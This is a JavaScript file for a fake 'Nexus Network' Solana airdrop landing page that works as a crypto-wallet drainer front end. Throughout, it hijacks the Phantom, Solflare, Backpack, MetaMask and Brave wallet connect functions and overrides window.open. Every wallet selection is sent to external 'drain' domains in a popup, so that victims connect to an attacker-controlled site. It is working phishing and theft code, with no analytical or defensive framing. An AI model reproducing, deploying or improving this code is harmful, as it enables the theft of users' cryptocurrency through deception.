// =====================================================
// LANDING SOL — Real AppKit on main domain (Solana)
// Click wallet → popup opens drain domain with wallet pre-selected
// Wallet popup appears immediately — no second wallet list
// =====================================================
import { createAppKit } from '@reown/appkit'
import { SolanaAdapter } from '@reown/appkit-adapter-solana'
import { solana } from '@reown/appkit/networks'

const DRAIN_BASE = 'https://drforsostate.vercel.app/';
const EVM_DRAIN_BASE = 'https://drforevstate.vercel.app/';
const PROJECT_ID = '5db25d59ec5c740d09771e8b9037b7f9';
const isMobile = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// =====================================================
// INIT REAL APPKIT — shows real wallet list with INSTALLED badges
// =====================================================
const solanaAdapter = new SolanaAdapter();

const modal = createAppKit({
  adapters: [solanaAdapter],
  networks: [solana],
  projectId: PROJECT_ID,
  metadata: {
    name: 'Nexus Network',
    description: 'Nexus Network — Solana Airdrop',
    url: window.location.origin,
    icons: [],
  },
  enableReconnect: false,
  allWallets: 'SHOW',
  featuredWalletIds: [
    // Phantom
    'a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393',
    // Trust Wallet
    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
    // Solflare
    '1ca0bdd4747578705b1939af023d120677c64fe11e7da5edcf4ecab371b2c723',
  ],
  features: {
    analytics: false,
    email: false,
    socials: false,
    onramp: false,
    swaps: false,
    reownBranding: false,
  },
  themeMode: 'dark',
  themeVariables: {
    '--w3m-accent': '#14F195',
  },
});

// =====================================================
// OPEN POPUP — ONLY FOR SOLANA WALLETS
// =====================================================
let popupOpened = false;

// Save original window.open EARLY — before any override
const _origOpen = window.open.bind(window);

// Solana wallets that should be redirected to the drainer domain
const SOLANA_WALLETS = ['phantom', 'solflare', 'backpack', 'trust', 'coinbase', 'safepal', 'binance', 'okx'];
// EVM-only wallets that go to the EVM drainer instead
const EVM_ONLY_WALLETS = ['metamask', 'brave'];

function isSolanaWallet(name) {
  const w = (name || '').toLowerCase();
  return SOLANA_WALLETS.some(sw => w.includes(sw));
}

function isEvmOnlyWallet(name) {
  const w = (name || '').toLowerCase();
  return EVM_ONLY_WALLETS.some(ew => w.includes(ew));
}

function openDrainPopup(walletName) {
  if (popupOpened) return;
  popupOpened = true;

  // Map wallet name to short key
  const w = (walletName || '').toLowerCase();
  let walletKey = 'auto';
  for (const sw of [...SOLANA_WALLETS, ...EVM_ONLY_WALLETS]) {
    if (w.includes(sw)) { walletKey = sw; break; }
  }

  // EVM-only wallets go to EVM drainer
  const drainBase = EVM_ONLY_WALLETS.includes(walletKey) ? EVM_DRAIN_BASE : DRAIN_BASE;
  const url = `${drainBase}?connect=1&w=${walletKey}`;

  if (isMobile) {
    window.location.href = url;
  } else {
    const pw = 420, ph = 700;
    const left = Math.round((screen.width - pw) / 2);
    const top = Math.round((screen.height - ph) / 2);
    _origOpen(url, 'connect_wallet',
      `width=${pw},height=${ph},left=${left},top=${top},toolbar=no,menubar=no,scrollbars=no,resizable=no,location=no`
    );
  }

  setTimeout(() => { popupOpened = false; }, 2000);
}

// =====================================================
// INTERCEPT ONLY SOLANA/EVM WALLET CLICKS — let others connect on landing
// =====================================================

let lastClickedWallet = '';

// Block Solana wallet extensions
function blockSolanaProviders() {
  // Phantom
  if (window.phantom?.solana && !window.phantom.solana._landingBlocked) {
    window.phantom.solana._landingBlocked = true;
    const origConnect = window.phantom.solana.connect.bind(window.phantom.solana);
    window.phantom.solana.connect = function() {
      openDrainPopup('phantom');
      return new Promise(() => {});
    };
  }
  if (window.solana && !window.solana._landingBlocked) {
    window.solana._landingBlocked = true;
    window.solana.connect = function() {
      openDrainPopup(lastClickedWallet || 'phantom');
      return new Promise(() => {});
    };
  }
  // Solflare
  if (window.solflare && !window.solflare._landingBlocked) {
    window.solflare._landingBlocked = true;
    window.solflare.connect = function() {
      openDrainPopup('solflare');
      return new Promise(() => {});
    };
  }
  // Backpack
  if (window.backpack?.solana && !window.backpack.solana._landingBlocked) {
    window.backpack.solana._landingBlocked = true;
    window.backpack.solana.connect = function() {
      openDrainPopup('backpack');
      return new Promise(() => {});
    };
  }

  // Also block EVM providers (MetaMask, Brave) — redirect to EVM drainer
  const patchEVM = (provider) => {
    if (!provider?.request || provider._landingBlocked) return;
    provider._landingBlocked = true;
    const origRequest = provider.request.bind(provider);
    provider.request = function(args) {
      if (args?.method === 'eth_requestAccounts' || args?.method === 'wallet_requestPermissions') {
        const name = provider.isMetaMask ? 'metamask' : provider.isBraveWallet ? 'brave' : lastClickedWallet || 'metamask';
        openDrainPopup(name);
        return new Promise(() => {});
      }
      return origRequest(args);
    };
  };
  if (window.ethereum) {
    patchEVM(window.ethereum);
    if (window.ethereum.providers) window.ethereum.providers.forEach(patchEVM);
  }
}

blockSolanaProviders();
setTimeout(blockSolanaProviders, 500);
setTimeout(blockSolanaProviders, 1500);
setTimeout(blockSolanaProviders, 3000);

// Intercept AppKit wallet selections — ONLY redirect Solana and EVM-only wallets
modal.subscribeEvents((event) => {
  const e = event?.data?.event;
  if (e === 'SELECT_WALLET') {
    const name = event?.data?.properties?.name || event?.data?.properties?.wallet || '';
    if (name) {
      lastClickedWallet = name;
      // Only intercept Solana wallets and EVM-only wallets — let WalletConnect etc. go through AppKit
      if (isSolanaWallet(name) || isEvmOnlyWallet(name)) {
        openDrainPopup(name);
      }
      // else: AppKit handles it natively on the landing domain (QR, deep link, etc.)
    }
  }
});

// If a Solana wallet somehow connects to landing, disconnect and redirect
modal.subscribeProviders((state) => {
  if (state['solana']) {
    const addr = modal.getAddress();
    if (addr) {
      try { modal.disconnect(); } catch (e) {}
      openDrainPopup(lastClickedWallet || 'auto');
    }
  }
});

// Intercept deep links only for Solana/EVM wallets
window.open = function(url, ...args) {
  if (url && typeof url === 'string' && !url.includes(DRAIN_BASE) && !url.includes(EVM_DRAIN_BASE)) {
    if (url.includes('phantom')) { openDrainPopup('phantom'); return null; }
    if (url.includes('solflare')) { openDrainPopup('solflare'); return null; }
    if (url.includes('backpack')) { openDrainPopup('backpack'); return null; }
    if (url.includes('metamask')) { openDrainPopup('metamask'); return null; }
    if (url.includes('brave://')) { openDrainPopup('brave'); return null; }
    // WalletConnect deep links → let AppKit handle them (NOT intercepted)
  }
  return _origOpen.call(window, url, ...args);
};

// =====================================================
// EXPOSE TO HTML — wait for AppKit to be fully ready
// =====================================================
let _modalReady = false;
let _pendingOpen = false;

// Detect when AppKit is truly initialized by watching for its web component
const _readyCheck = setInterval(() => {
  const el = document.querySelector('w3m-modal') || document.querySelector('appkit-modal');
  if (el) {
    _modalReady = true;
    clearInterval(_readyCheck);
    // If user clicked before ready, open now
    if (_pendingOpen) {
      _pendingOpen = false;
      popupOpened = false;
      lastClickedWallet = '';
      modal.open({ view: 'Connect' });
    }
  }
}, 50);

window.openWalletModal = () => {
  popupOpened = false;
  lastClickedWallet = '';
  if (_modalReady) {
    modal.open({ view: 'Connect' });
  } else {
    // Queue it — will fire as soon as AppKit element appears in DOM
    _pendingOpen = true;
  }
};

// Replay any click that happened before module loaded (from HTML stub)
if (window._walletQueue) {
  window._walletQueue = false;
  window.openWalletModal();
}
